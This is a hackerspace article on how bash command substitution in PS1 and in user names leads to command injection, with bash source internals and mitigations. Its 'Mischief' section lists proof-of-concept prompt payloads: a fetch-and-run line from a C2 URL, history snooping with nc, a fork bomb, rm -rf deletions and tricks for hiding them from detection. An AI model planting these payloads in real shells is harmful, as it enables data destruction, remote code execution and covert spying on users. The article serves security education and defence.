<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><title>Stupid bash tricks- command substitution, command injection, and the bash command prompt | 801 Labs</title><meta name="description" content="description"/><link rel="canonical" href="https://www.801labs.org/research-portal/post/bash-command-injection"/><link rel="icon" href="/favicon.png" sizes="16x16"/><meta property="og:title" content="Stupid bash tricks- command substitution, command injection, and the bash command prompt | 801 Labs"/><meta property="og:description" content="801 Labs is a Salt Lake City based hackerspace created by local information technology, electronics, and information security enthusiasts."/><meta property="og:image" content="https://www.801labs.org2024/01/bash-source.png"/><meta property="og:url" content="https://www.801labs.org/research-portal/post/bash-command-injection"/><meta property="og:site_name" content="801 Labs"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@801Labs"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="theme-color" content="#6bf0c2"/><link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;0,900;1,400&amp;family=Tomorrow:wght@400;600;700&amp;display=swap" rel="stylesheet"/><meta name="google-site-verification" content="QnlAT_0caLTAeL1e8V-RlHWBX7xauM_CnxY_5-ltIF4"/><link rel="preload" href="/_next/static/css/ed0270f2d5d9bb661de1.css" as="style"/><link rel="stylesheet" href="/_next/static/css/ed0270f2d5d9bb661de1.css" data-n-g=""/><noscript data-n-css="true"></noscript><link rel="preload" href="/_next/static/chunks/main-b734f4d0c2c599295fe6.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.464b393922c27508c360.js" as="script"/><link rel="preload" href="/_next/static/chunks/commons.baecec2b1f31cc8f0ab6.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-24410fa0a3d143b2bfcc.js" as="script"/><link rel="preload" href="/_next/static/chunks/cb1608f2.9b44609261640b8f626b.js" as="script"/><link rel="preload" href="/_next/static/chunks/a9a7754c.53d20200875279da8636.js" as="script"/><link rel="preload" href="/_next/static/chunks/16bc220b6d50f93026463b2cd002c45681ffbe2f.62ec2799f7445d763091.js" as="script"/><link rel="preload" href="/_next/static/chunks/269ea3ef5216fdb5e29fe1b24ee03a8936e3d31a.82f69e01bd7fbd7d6f07.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/research-portal/post/%5Bslug%5D-4d5753f44f6a2e9d1cc2.js" as="script"/></head><body><div id="__next"><div class="bg-white font-sans fluid-text-base"><div class="fixed inset-0 z-40 bg-graphite-800 hidden" style="--bg-opacity:0.4"></div><div class="fixed right-0 top-0 h-screen overflow-y-auto z-50 w-full sm:w-64 font-display bg-graphite-800 text-white hidden"><div class="px-5 pt-5 text-right"><button class="px-4 py-2" title="Close Menu"><span class="sr-only">Close Menu</span><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11 fa-lg " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg></button></div><ul class="pt-2 pb-5 fluid-text-lg"><li><a class="py-1 px-5 link--white" href="/about/">About</a><ul class="fluid-text-base"><li><a class="py-1 pl-10 pr-5 link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/about/news/1/">News</a></li></ul></li><li><a class="py-1 px-5 link--white" href="/research-portal/1/">Learn</a></li><li><a class="py-1 px-5 link--white" href="/get-involved/">Get Involved</a><ul class="fluid-text-base"><li><a class="py-1 pl-10 pr-5 link--white" href="/get-involved/events/">Events</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/hackercamp/">Hackercamp</a></li></ul></li><li><a class="py-1 px-5 link--white" href="/nonprofit/">Nonprofit</a></li><li><a class="py-1 px-5 link--white" href="/contact/">Contact Us</a></li><li><a class="py-1 px-5 link--tangerine font-bold" href="/donate/">Donate &gt;</a></li></ul></div><div class="page"><header class="page-header font-display bg-graphite-800 text-white"><div class="container mx-auto px-5 lg:px-10 xl:px-16 py-3 lg:py-5 flex"><div class="flex-initial"><a class="text-white" href="/"><svg xmlns="http://www.w3.org/2000/svg" class="fill-current" viewBox="0 0 1566.7 420.9" width="217"><title>801 Labs - a Community Hackerspace</title><path d="M131.5 261.8h24.1c1.8 0 3.2 1.5 3.2 3.2 0 1.8-1.5 3.2-3.2 3.2h-24.1c-1.8 0-3.2-1.5-3.2-3.2-.1-1.8 1.4-3.2 3.2-3.2z"></path><path d="M194.9 148.8V60.9c13-4.1 21.9-16.1 21.9-29.8 0-17.2-14-31.2-31.2-31.2h-85.3c-13.6.1-25.7 9-29.7 22-5.1 16.4 4.1 33.9 20.5 39v87.8c-7.5 2.9-14.8 6.5-21.7 10.6-67.6 40.6-89.6 128.2-49.1 195.8 12.9 21.3 31 39.1 52.6 51.6 18.4 10.7 29.7 12.9 32.7 13.4 12.1 1.7 22.7-1.3 30.5-8.8 9.3-8.8 14.9-23.7 16.6-44.2.6-8.6.7-17.3.3-25.9 3.6-2.4 6.3-6.1 7.3-10.7l.3-1.2c0-.6.1-1.5.1-2.4h16c6.3 0 11.5-5.1 11.5-11.4v-.9h-.2c.1-.6.2-1.2.2-1.7l.2-34.4c0-1.5-1.2-2.6-2.6-2.6h-1.2c-1.5 0-2.6-1.2-2.6-2.7l.1-39.6c0-1.4-1.2-2.6-2.6-2.6l-71.7-.2c-1.4 0-2.6 1.2-2.6 2.6l-.1 39.6c0 1.4-1.2 2.6-2.6 2.6h-1.2c-1.4 0-2.6 1.2-2.6 2.6l-.1 34.6c0 .6.1 1.3.2 1.9h-.2v.7c0 6.3 5.1 11.5 11.4 11.5h16.3c.1.8.4 1.6.6 2.4 0 0 3.3 8.8 9.1 12.8 1 22.2-.7 46.7-11.5 56.8-4.1 3.9-9.4 5.3-16.5 4.3-.4-.1-9.7-1.5-26.5-11.2-19.1-11-35.1-26.7-46.5-45.6-3.5-5.8-6.5-11.9-9-18.2-25.6-64.5 6-137.5 70.4-163.1 2-.8 11.7-5.7 11.7-11.3V54.2v-.6c0-4.6-3.7-8.2-8.2-8.2-7.8-.1-14-6.6-13.9-14.4.1-7.8 6.6-14 14.4-13.9h85.3c7.8-.1 14.2 6.1 14.4 13.9.1 7.8-6.1 14.2-13.9 14.4h-.6c-4.5.3-7.9 4.3-7.6 8.9v99.5c0 5.9 9.8 10.6 11.7 11.3 47.9 19.1 79.3 65.5 79.3 117 0 57.5-38.5 107.7-93.5 122.1-3.7 1-6.3 4.4-6.3 8.2 0 4.7 3.8 8.5 8.5 8.5.7 0 1.5-.1 2.2-.2 62.5-16.4 106.2-73.4 106.2-138.6-.1-59-36.3-111.9-91.2-133.3zm-62.8 155.4l-1.6 7.7c-.4 1.5-1.7 2.5-3.2 2.5l-13.4-.3c-1.5 0-2.6-1.2-2.6-2.7V291c0-1.4 1.2-2.6 2.6-2.6h1.2c1.4 0 2.6-1.2 2.6-2.6l.1-39.6c0-1.4 1.2-2.6 2.6-2.6h5.4c1.4 0 2.6 1.2 2.6 2.6v7.6c0 1.5 1.2 2.6 2.6 2.6h1.2c1.4 0 2.6-1.2 2.6-2.6v-7.3c0-1.4 1.2-2.6 2.6-2.7l11.9-.1c1.4.1 2.5 1.2 2.5 2.6v7.5c0 1.4 1.2 2.6 2.6 2.6h1.3c1.4 0 2.6-1.2 2.6-2.6v-7.6c0-1.4 1.2-2.6 2.6-2.6h5.3c1.5 0 2.7 1.1 2.7 2.6v.1l-.1 39.6c0 1.5 1.2 2.6 2.6 2.6h1.2c1.5 0 2.6 1.2 2.6 2.6v20.4c0 1.4-1.2 2.6-2.6 2.6h-13.4c-1.5-.1-2.8-1.1-3.1-2.6l-1.6-7.7c-.4-1.5-1.6-2.5-3.1-2.5l-16.4.2c-1.2.2-2.5 1.2-2.9 2.7z"></path><path d="M453.1 366.9c-40 0-64.9-24.1-64.9-59.7v-30c-.9-17 8.3-32.9 23.3-40.8-14.1-6.3-23-21.5-23-40.8v-26.9c0-35.6 24.5-59.7 64.5-59.7s64.9 24.1 64.9 59.7v26.9c0 19.3-8.9 34.5-23 40.8 15.2 7.8 24.4 23.7 23.7 40.8v30c.1 35.7-25.1 59.7-65.5 59.7zm23.7-196.5c-.6-13-11.7-23-24.7-22.4-12.1.6-21.8 10.3-22.4 22.4V203c1.1 13 12.5 22.7 25.5 21.6 11.5-1 20.6-10.1 21.6-21.6v-32.6zm.4 100.4c0-11.5-8.2-21.9-24.1-21.9-11.8-1-22.3 7.8-23.3 19.6-.1.8-.1 1.5-.1 2.3v34.5c-.7 12.2 8.7 22.7 20.9 23.3h2.4c12.4.8 23.2-8.6 24.1-21 .1-.8.1-1.5 0-2.3v-34.5zM630.3 366.9c-40 0-65.6-25.9-65.6-64.1V173.7c0-38.6 25.5-64.1 65.6-64.1 40.1 0 66 25.5 66 64.1v129.1c-.1 38.2-25.6 64.1-66 64.1zM654 170.1c0-11.9-8.9-21.5-23.7-21.5-11.8-1-22.3 7.8-23.3 19.6-.1.6-.1 1.3-.1 1.9v135.7c0 11.9 9.6 21.6 21.4 21.6.6 0 1.3 0 1.9-.1 14.8 0 23.7-9.6 23.7-21.5V170.1zM753.7 361.4V134.2c14.1 0 19.3-9.3 19.3-19.6h23.3v246.8h-42.6zM930.6 361.4V114.5h45.9v206.1h69v40.8H930.6zM1174.8 361.4l-8.2-48.4h-43.7l-8.9 48.4h-43l49.6-246.8h51.5l49.5 246.8h-46.8zm-28.9-180.2l-16.7 95.3h31.5l-14.8-95.3zM1335.3 361.4h-77.8V114.5h77.2c33.7 0 54.5 18.2 54.5 52.3v26.9c0 21.1-8.2 37.1-29.3 41.5 22.2 5.9 30.4 21.1 30.4 41.9v32.3c-.2 34.2-21.3 52-55 52zm9.6-191.3c0-11.1-4.8-17.8-16.1-17.8h-24.9v67.8h23c11.9 0 18.2-6.3 18.2-19.3l-.2-30.7zm.7 103.5c0-13-6.3-19.6-18.2-19.6h-23.7v69.9h25.9c11.5 0 16.1-6.3 16.1-17.8l-.1-32.5zM1498.4 366.9c-42.3 0-68.6-25.2-68.6-63.7v-17.1h42.3v14.5c0 18.2 8.5 28.2 25.2 28.2s24.5-9.6 24.5-24.9c0-19.6-12.6-33-37.1-51.2-24.5-18.2-52.6-42.6-52.6-77.1 0-35.6 23-66.3 67.5-66.3 38.9 0 64.9 26.9 64.9 63.4v16.1h-41.9V174c0-15.2-7.8-26.3-23.3-26.3-11.5-.8-21.4 7.8-22.2 19.3-.1 1-.1 1.9 0 2.9 0 20.8 12.2 31.5 39.6 51.5 29.3 21.9 50 44.1 50 77.5-.2 39.5-27.7 68-68.3 68z"></path></svg></a></div><div class="lg:hidden flex-1 text-right"><button class="px-4 py-2" title="Toggle Menu"><span class="sr-only">Toggle Menu</span><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="bars" class="svg-inline--fa fa-bars fa-w-14 fa-lg " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div><ul class="flex-1 hidden lg:flex justify-end fluid-text-lg"><li class="group relative"><a class="p-3 link--white" href="/about/">About</a><ul class="hidden group-focus-within:block group-hover:block py-2 absolute left-0 w-64 bg-graphite-800 fluid-text-base"><li><a class="block py-1 px-5 link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="block py-1 px-5 link--white" href="/about/news/1/">News</a></li></ul></li><li class="group relative"><a class="p-3 link--white" href="/research-portal/1/">Learn</a></li><li class="group relative"><a class="p-3 link--white" href="/get-involved/">Get Involved</a><ul class="hidden group-focus-within:block group-hover:block py-2 absolute left-0 w-64 bg-graphite-800 fluid-text-base"><li><a class="block py-1 px-5 link--white" href="/get-involved/events/">Events</a></li><li><a class="block py-1 px-5 link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="block py-1 px-5 link--white" href="/hackercamp/">Hackercamp</a></li></ul></li><li class="group relative"><a class="p-3 link--white" href="/nonprofit/">Nonprofit</a></li><li class="group relative"><a class="p-3 link--white" href="/contact/">Contact Us</a></li><li class="group relative"><a class="p-3 link--tangerine font-bold" href="/donate/">Donate &gt;</a></li></ul></div></header><main class="page-content"><div class="bg-graphite-900 bg-image-grid bg-top text-white"><div class="container-1400 mx-auto px-5 py-20 text-center"><h2 class="h1 text-shadow-glow">801 Labs Research Portal</h2></div></div><div class="container-1400 mx-auto px-5 py-20 md:flex md:space-x-20"><aside class="hidden md:block md:w-1/4"><div><h3 class="fluid-text-lg font-bold bg-black text-white px-5 py-1 mb-3">Tags</h3><ul class="px-5 py-1 space-y-2"><li><a href="/research-portal/tag/bash/1/">bash</a></li><li><a href="/research-portal/tag/biohacking/1/">biohacking</a></li><li><a href="/research-portal/tag/buffer-overflow/1/">buffer overflow</a></li><li><a href="/research-portal/tag/command-injection/1/">command injection</a></li><li><a href="/research-portal/tag/development/1/">Development</a></li><li><a href="/research-portal/tag/dll-injection/1/">DLL Injection</a></li><li><a href="/research-portal/tag/domains/1/">domains</a></li><li><a href="/research-portal/tag/ee/1/">EE</a></li><li><a href="/research-portal/tag/how-to/1/">how to</a></li><li><a href="/research-portal/tag/ipv6/1/">IPv6</a></li><li><a href="/research-portal/tag/langsec/1/">langsec</a></li><li><a href="/research-portal/tag/linux/1/">linux</a></li><li><a href="/research-portal/tag/makefile/1/">Makefile</a></li><li><a href="/research-portal/tag/memory/1/">memory</a></li><li><a href="/research-portal/tag/parsing/1/">parsing</a></li><li><a href="/research-portal/tag/pcap/1/">pcap</a></li><li><a href="/research-portal/tag/phishing/1/">phishing</a></li><li><a href="/research-portal/tag/re/1/">RE</a></li><li><a href="/research-portal/tag/research/1/">research</a></li><li><a href="/research-portal/tag/rfid/1/">RFID</a></li><li><a href="/research-portal/tag/shell/1/">shell</a></li><li><a href="/research-portal/tag/story/1/">Story</a></li><li><a href="/research-portal/tag/tutorial/1/">Tutorial</a></li><li><a href="/research-portal/tag/windows-api/1/">Windows API</a></li><li><a href="/research-portal/tag/windows-hacking/1/">Windows Hacking</a></li></ul></div></aside><div class="md:w-3/4"><h1 class="h2 mb-10">Stupid bash tricks- command substitution, command injection, and the bash command prompt</h1><img loading="lazy" src="/_next/static/images/bash-source-320-3796f1dc37aa4597510753d5440301e0.png" sizes="(min-width: 960px) 960px, 100vw" alt="Stupid bash tricks- command substitution, command injection, and the bash command prompt" class="mb-8 mx-auto max-h-100" srcSet="/_next/static/images/bash-source-320-3796f1dc37aa4597510753d5440301e0.png 320w,/_next/static/images/bash-source-468-2f1cb231aea05453d4911696412750f6.png 468w" width="468" height="204" style="max-width:min(100%, 468px)"/><div class="space-y-6 markdown"><p>It turns out you can use special characters in linux user names.  Cute, but it can have some unexpected consequences.  Be glad your user name isn’t <code>$(rm -rf ~)</code> for instance.  Can you guess what happens when you open up your first interactive bash shell?</p>
<h1>Command Substitution</h1>
<p>Yup, command substitution happens.  Bye bye, files.  Bash, like all good shells, will take the output of a command contained within $() or `` (backticks) and substitute the command’s output into the string where the command was.  Pretty handy for all kinds of shell tasks, and it even works in the prompt definition string.  Even if your user name happens to be an injected command!</p>
<p>This happens because it's typical for the prompt to contain the user name.  Bash uses the environment variable, PS1 to define the prompt string.  Escaped characters like \u and \w, for instance, get expanded into other strings that are useful for dynamic prompt components, like the user name or working directory.  But even more flexibility comes from substituting the output of an arbitrary command.  In the above example, the \u in the prompt string gets substituted by <code>$(rm -rf ~)</code>, which then gets substituted by the output of running that command.  Even if the command yields no output, it has still been run.</p>
<p>Bash also recognizes PS2, PS3, and PS4, for various, less-commonly seen prompts.  PS2 is probably most familiar to the average user as the "> " prompt when entering a multi-line command.  All the parsing and command substitution topics discussed below also apply to those prompts, but they are less frequently encountered.  Other than to briefly note here that they might provide a more obscure or niche attack vector, they will not be discussed further in this writeup.</p>
<h1>Parsing</h1>
<p>Shells have to do a lot of parsing, and do it correctly, every time.  Writing good parsers is actually really hard, in part because it’s so easy to write vulnerable code.  It’s been suggested that writing parsers should be done as rigorously as writing cryptographic libraries1– in other words, don’t “roll your own.”</p>
<p>If you need a parser that doesn’t already exist, and don’t want to write it from scratch yourself, you’re in luck.  General purpose parser generators, like GNU Bison2, Yacc (Yet Another Compiler Compiler)3 and various others take a user-defined, context free grammar and use it to output code (C, in this case) that performs the corresponding parsing for you.</p>
<p>The bash code base employs Bison to generate a core function called yyparse from the grammar defined in <code>parse.y</code>.  This file also contains C code snippets which Bison copies directly, along with the generated yyparse, into a source file called <code>y.tab.c</code>.</p>
<p>When parsing <code>PS1</code>, Bash expands \ characters (like \u and \w) before it performs command substitution.  This is why <code>\u</code> -> <code>$(rm -rf ~)</code> -> <code>&#x3C;command execution></code>.  But suppose that your working path contains a directory named <code>$(ls)</code>?  Will <code>ls</code> be run?  In this case, actually, no.  The reason is that the bash source code (in <code>parse.y</code>, function <code>decode_prompt_string</code>) puts the directory string into double quotes, masking it from future expansion.</p>
<p>As of the latest stable release at the time of this writeup (5.2), bash doesn’t double-quote user names after expansion from \u, though.  The good news: the expanded \u will be double-quoted in a future release.4,5  This exempts the user name string from being parsed for command substitution.</p>
<p>When bash finds a command substitution that it needs to parse in <code>PS1</code>, it begins a series of nested calls starting with <code>decode_prompt_string</code> in <code>parse.y</code>, and going back and forth between routines in <code>parse.y</code>, <code>subst.c</code>, and <code>builtins/evalstring.c</code>, early on joining the common pathway of command substitution, and ultimately calling <code>execute_command_internal</code> in <code>execute_cmd.c</code>.  The subshell created to do this captures the output of the command and returns it to <code>decode_prompt_string</code>, and that goes into your prompt string.</p>
<p>Note: This article specifically focuses on how bash does this, but some other shells will do it in their own way, too.  [D]ash will execute commands, as will zsh if you first enable the PROMPT_SUBST (promptsubst) option,6,7 but many others will not.</p>
<p>It’s worth mentioning that commands executed via substitution don’t make it, by themselves, into the <code>.bash_history</code> file.  And why should they?  These substitutions are helpers that are often part of scripts or other automated tasks.  The history file would fill up quickly with chaff unless it ignored all of these commands.  Generally speaking, only commands typed into the CLI make it into history.  For more information, see the history man page, or a nice writeup by MattCASmith.8</p>
<h1>The Command Prompt</h1>
<p>Command substitution is, of course, an indispensable part of shells.  And it’s a convenient way to inject useful dynamic text into your prompt string.  But if you simply want to execute a command before every prompt, command substitution in the prompt string is not your “go-to” way to do this.</p>
<p>For that purpose, bash offers the user an environment variable called <code>PROMPT_COMMAND</code>, and it runs this command before it gets into the business of generating each command prompt.  <code>PROMPT_COMMAND</code> can also work in concert with <code>PS1</code>, depending on how you wanted to do things.  But almost anything you can do with <code>PROMPT_COMMAND</code> can also be crammed into <code>PS1</code>, with at least one major exception.  <code>PROMPT_COMMAND</code> commands are executed in the current shell, but <code>PS1</code> substituted commands are performed in a subshell.  The impact of this is that environment changes in the subshell die with the subshell and do not back-propagate to the parent shell.  So, output redirection and environment variable changes are durable if done by <code>PROMPT_COMMAND</code>, but ephemeral if done by <code>PS1</code>.  Another difference: <code>PS1</code> will expand special escape characters, such as ‘\u’ for user names, as mentioned above, but <code>PROMPT_COMMAND</code> will not.</p>
<p>Different linux distributions and shells tend to offer their own default versions of what they consider to be a useful and aesthetic prompt.  But many users customize <code>PS1</code> to suit their own needs.  One category of uses is for presenting timely information.  For instance, you might have it display your IP address, or change colors depending on the most recent exit status, or show which git branch is checked out in your working directory.</p>
<p>Another category of uses involves automating frequent tasks or checks.  For instance, commands run by <code>PS1</code> or <code>PROMPT_COMMAND</code> might run <code>history -a</code> to ensure every regular command that has been executed is written immediately to <code>.bash_history</code> instead of waiting until the terminal session closes--which helps prevent loss of history if the shell is SIGKILLed or power is suddenly lost.</p>
<p>This capacity can, of course, be used for mischief in the wrong hands.  It may seem like an inefficient method for an attacker, because if they can change an environment variable for your prompt, they can probably execute other code, so why would they bother with this?</p>
<p>One scenario involves the delivery phase.  A threat actor may have only a brief window of opportunity to enter commands on a keyboard.  Or, they might social engineer a victim to run a malicious script which edits <code>PS1</code> or <code>.bashrc</code>.  These opportunities might establish a foothold.  Another scenario might involve an attacker who already owns the victim’s account, but needs to avoid certain canaries or countermeasures.</p>
<p>Yet another, potentially powerful exploit, could involve a compromised authentication server.  If an attacker can add or control account names in the server's database, providing a login as <code>$(some-command)</code> might allow for code execution on an otherwise hardened network host.  <code>some-command</code> could launch a reverse shell, for instance, to help traverse a firewall.  This is a potential area for future research.</p>
<h1>Mitigation, Part 1</h1>
<p>To put it simply: if an attacker can control the user name, a defender must watch out for expansion by \u.  If the attacker can control <code>PS1</code> or <code>PROMPT_COMMAND</code> directly, it doesn't necessarily matter what the user name is; the defender must always protect the environment variables.  These are similar attack vectors that share a common, final pathway.  In practice, both should be guarded against in accordance with one's threat model, resources, and priorities.  Eliminating all command substitution entirely would be an effective, but quite extreme, measure, and one not likely to be worth the costs in most cases.  It would generally require a custom patch, but the change would be easy.  User name-based command substitution, on the other hand, should be less of an issue in future releases (see above).</p>
<p>Beyond universal security principles (including hardening and regular audits/updates on any network authentication servers), specific mitigations for command substitution attacks could include periodic or automatic verification of the contents of <code>.bashrc</code>, <code>/etc/environment</code>, any routine scripts, and specific environment variables.  It’s worth being aware that modules like PAM can also set environment variables, although an exploit at this level would entail more dire concerns.</p>
<p><code>PS1</code> and <code>PROMPT_COMMAND</code> can both contain commands to validate themselves and/or the other variable, and alert the user if an unexpected state is detected.  <code>PROMPT_COMMAND</code> could reset <code>PS1</code> to a trusted value.  Either could perform validation, for instance by comparing against a trusted value (such as a string or hash stored in a write-protected file).  This would be an imperfect, but relatively inexpensive, method for situations where you could screen for changes in <code>PS1</code>.</p>
<p>Example, in .bashrc:</p>
<pre><code>PROMPT_COMMAND=’echo $PS1 | md5sum -z | diff ~/.myPS1hash - > /dev/null;\
if [[ $? -gt 0 ]]; then\
      echo Warning, PS1 altered;\
    else\
      echo PS1 OK;\
fi; # ugly

Or in PS1:
PS1='$( \
    echo $PS1 | md5sum -z | diff -q - ~/.myPS1hash >/dev/null; 
    if [[ $? -eq 0 ]]; then \
        echo -e "\033[1;32m\u@\h:\w\\$ \033[0m"; \ # Green text means OK
    else \
        echo -e "\033[1;31m\u@\h:\w\\$ \033[0m"; \ # Red text is bad
    fi )' # less ugly
</code></pre>
<p>Once you set your new <code>PS1</code>, just <code>echo $PS1 | md5sum -z > ~/.myPS1hash</code> and make sure it is write protected, or give ownership to root, or put it on a read-only medium.</p>
<h1>Mitigation, Part 2</h1>
<p>Since this is, essentially, a screening methodology, it is worth interjecting a few words on proper screening test design.</p>
<p>An ideal screening test is fast, cheap and highly sensitive, at the expense of specificity.  In other words, you accept the burden of many false positive results, for the benefit of being less likely to miss a true positive event.  Given that a test which is fast and cheap will probably suffer costs in the accuracy department, the screening test is usually intentionally tuned to favor flagging something as abnormal if there’s any uncertainty.  The mitigation strategy described so far, of checking for changes in variables, is highly specific, i.e. it’s not likely to falsely report a change in a string.  But, it’s not very sensitive, i.e. there are many ways an effective attacker could defeat it.  In other words, it’s the opposite of what a good screening test should be, in at least some ways.</p>
<p>Unfortunately, in cybersecurity, sensitivity is an ever-elusive goal.  With intelligent adversaries trying to be as undetectable as possible, creating a high sensitivity screening test for this situation can be very difficult.  Easy screening methods for this attack all basically depend on the attacker not being aware of, nor bothering to try, circumvention.</p>
<p>Not only are simple detection methods easy to circumvent, but robust detection methods are hard to create.  Indeed, a specific challenge here is that it is tough to actively monitor these variables from outside the shell itself.  <code>/proc/&#x3C;pid>/environ</code> can helpfully show the shell’s initial environment, but it only updates when the process starts, and is therefore insufficient.  Following an environment variable directly from outside the shell would probably require something on the level of a ptrace system call.  Now we’re getting into some pretty invasive monitoring, which is less easy to set up and may entail significant performance costs.  One could indirectly follow environment variables by periodically exporting the environment to a file, and ensuring a daemon monitors that file.  But even that method suffers from various weaknesses, especially if it depends on <code>PROMPT_COMMAND</code> or <code>PS1</code> themselves to do the exporting.  There are open source tools that may be able to monitor a process' internal environment, but they are untested by this author.</p>
<h1>Mischief</h1>
<p>The point is not to present malicious code here, but to provide proof of concept for non-trivial attacks, such as denial of service, data destruction, or exfiltration.  And while pretty much all of these could be adapted into <code>PROMPT_COMMAND</code>, they are simply shown here in <code>PS1=</code> form to highlight command substitution.</p>
<p>One thing an attacker wouldn’t want to do, would be to make an obvious change to the appearance of the command prompt itself.  The following examples assume a basic command prompt appearance for simplicity's sake, but a better approach might involve <code>PROMPT_COMMAND</code> capturing the original <code>PS1</code> into a backup variable, so then <code>PS1</code> can invoke that backup variable to recreate the original appearance.</p>
<h3>Examples (i.e. PS1=' ', using single quotes)</h3>
<p>Nuisances: Injecting delays, screen clearing pranks</p>
<pre><code>'$(sleep 2)\u@\h:\w$ '
'$(clear)\u@\h:\w$ '
</code></pre>
<p>Snooping on command history:</p>
<pre><code>'$(history -a; tail -n 1 ~/.bash_history | nc -q 0 localhost 12345)\u@\h:\w$ '
# set up a listener on localhost 12345 to snoop on what the user is running.
# nc -u might be necessary or simpler in some cases, too.
</code></pre>
<p>There are limits to how real-time you can snoop.  You might expect this would allow for complete output logging:</p>
<pre><code>'$([[ -t 1 ]] &#x26;&#x26; exec > >(tee >(nc -q 0 localhost 12345)) 2>&#x26;1)\u@\h:\w$ '
</code></pre>
<p>But, this does not work.  The command is run in a sub-shell, so any output redirection method that is born there, dies there.  This aspect makes it hard, if not impossible, to use output redirection as intended. (Prove me wrong, though!)</p>
<p>Fork bombing (see evading, below):</p>
<pre><code>'`bomb() { bomb | bomb&#x26; }; bomb`\u@\h:\w$ '
# can obfuscate easily by replacing 'bomb' with a single character
</code></pre>
<p>RCE / fetching commands from a C2 server:</p>
<pre><code>'$(wget -q -O - www.example.com/c2/script_to_run.sh | sh)\u@\h:\w$ '
</code></pre>
<p>Gradually filling up the file system:</p>
<pre><code>'`echo \`cat ~/.profile\` >> ~/.profile`\u@\h:\w$ '
</code></pre>
<p>Deleting a user's home folder:</p>
<pre><code>'$(rm -rf ~)\u@\h:\w$ '

'$(rm -rf /* > /dev/null 2>&#x26;1)\u@\h:\w$ '
</code></pre>
<p>The latter will not delete everything, but it will delete everything the user is privileged for, including their home folder. As a bonus, it will also tie things up for a while as it traverses the entire filesystem.</p>
<p>Deleting all files (after tricking them into entering the sudo pw)</p>
<pre><code>'$(sudo rm -rf /*)\u$\h:\w$ '
</code></pre>
<p>Some potential attacks are limited by the command substitution occurring in a subshell.  Future work might include how to potentially use a tool like script to log all shell text, or how to build an actual keylogger, which would be more complicated.  Another complicated exploit might involve engineering the user into entering their current password, which could be exfiltrated or used to change the password itself.</p>
<h1>Evading detection:</h1>
<p>Some actions, like erasing a user’s home folder, or fork bombing, are so drastic that they likely result in immediate discovery of the attack.  An attacker can be sneakier by combining some of the more impactful attacks with a probabilistic check.  If a fork bomb only executes 1 in 100 times, for instance, it is much more likely to misdirect blame toward something else:</p>
<pre><code>'if [ $(($RANDOM % 100)) -eq 1 ]; then do_something_nasty; fi'
</code></pre>
<p>These commands kind of stick out in PS1.  Maybe we can obfuscate them a little bit.  What about base64 encoding your command?</p>
<pre><code>'$(echo c2xlZXAgMg== | base64 -d)'
</code></pre>
<p>You could also use <code>PROMPT_COMMAND</code> to auto-revert <code>PS1</code>, to hide your tracks.  If you recall above, <code>PS1</code> cannot do this to itself, due to the subshell.  Only a <code>PROMPT_COMMAND</code> instruction can do this reversion.  Despite that, there are lots of ways to do this (assume <code>check_for_something</code> is a function the attacker controls):</p>
<pre><code>'if [ "$(check_for_something)" -eq 1 ]; then PS1=$OLDPS1 "; fi'
'[ “$(check_something 2> /dev/null)” ] &#x26;&#x26; PS1=$OLDPS' # trivially more concise, but potentially less robust than an if statement
</code></pre>
<p>Recent versions of bash (since 5.1-alpha) allow <code>PROMPT_COMMAND</code> to be an array of commands.  This could facilitate removing incriminating commands without having to selectively regenerate an entire, long string.</p>
<p>Speaking of covering your tracks, remember how prompt command substitution does not show up in bash history? There are, of course, many ways to avoid recording commands in the bash history, but one of them might be executing them by prompt command substitution. Forensic investigators should already understand that bash history is relatively specific, but not sensitive, diagnostically speaking.  In other words: if something is in the history, it probably happened...  but if it’s not there, it doesn’t mean it didn’t happen.</p>
<p>A final word on user names: this whole journey began with the observation (By Ben Kallus and Jonah Weinberg of ISTS/Dartmouth College) that linux behaves strangely when a user has a malicious name, like <code>$(rm -rf ~)</code>.  But the user name could be malicious without invoking command substitution.  For instance, the user name "<code>../tmp</code>", yields an unexpected account with a valid, but non-obvious, home folder, which could serve as a back door of sorts.</p>
